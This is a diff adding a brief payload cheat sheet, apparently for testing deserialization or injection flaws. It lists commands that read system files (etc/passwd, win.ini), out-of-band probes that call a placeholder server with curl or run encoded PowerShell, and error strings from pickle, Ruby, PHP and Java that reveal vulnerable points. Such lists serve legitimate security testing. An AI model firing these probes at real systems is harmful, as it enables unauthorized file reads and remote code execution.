@@ -1,0 +1,19 @@
+Reflection
+==========
+cat etc/passwd
+type C:\WINDOWS\win.ini
+
+OOB
+=========
+curl [SERVER]
+powershell -e [PS]
+
+
+Errors
+=========
+pickle errors = pickle., <module>
+ruby errors = incompatible marshal, `load', control characters, `parse'
+php errors = E_NOTICE
+java errors = InvalidClassException, Exception in, at com.
+
+
